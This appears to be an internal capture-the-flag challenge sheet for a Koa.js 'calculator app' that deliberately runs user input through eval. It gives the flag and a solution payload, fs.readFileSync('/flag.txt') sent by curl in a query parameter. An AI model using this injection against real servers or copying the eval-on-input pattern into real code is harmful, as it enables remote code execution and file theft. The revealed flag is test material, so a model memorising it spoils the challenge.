# calculator app

> Category: web
> Suggested Points: 150
> Distribute: index.js

# Description
> Detailed description as it would need to be explained to other lab members

Calculator app that is using eval on the backend. They can just type in 
javascript and it will run it.

# Deployment
> Any special information about the deployment if there is a server component

Koajs app that listens on port 5000

# Flag

`flag{rce_is_a_fun_thing}`

# Solution
> As detailed as possible description of the solution. Not just the solver script. As full a description as possible of the solution for the challenge.

Since the web server is just running what you put in the calculator as javascript,
you can just put in anything that will read the file. For me, I just did 
`fs.readFileSync("/flag.txt")`.

```
curl http://localhost:5000/?expression=fs.readFileSync%28%22%2Fflag.txt%22%29
```

# Potential Breakage
> Potential places the challenge could break (not applicable to all challenges)

RCE, so all the stuff that comes with that. We'll need to make sure everything has the 
right permissions in the container.
